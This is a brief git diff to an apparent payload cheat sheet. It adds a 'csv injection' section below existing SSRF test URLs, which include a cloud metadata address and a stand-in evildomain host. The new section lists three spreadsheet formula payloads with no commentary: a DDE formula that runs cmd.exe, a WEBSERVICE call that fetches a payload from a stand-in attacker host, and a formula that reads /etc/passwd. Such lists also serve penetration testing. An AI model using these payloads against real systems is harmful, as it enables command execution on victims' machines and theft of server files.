@@ -913,3 +913,12 @@ https://169.254.169.254
 file://127.0.0.1
 https://realdomain/?resource=https://realdomain.evildomain:5555/secret.txt
 ```
+
+### csv injection
+https://www.veracode.com/blog/secure-development/data-extraction-command-execution-csv-injection
+
+```
+=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c calc.exe'!''
+=WEBSERVICE("http://evildomain.tld/payload.txt")
+='file://etc/passwd'#$passwd.A1
+```
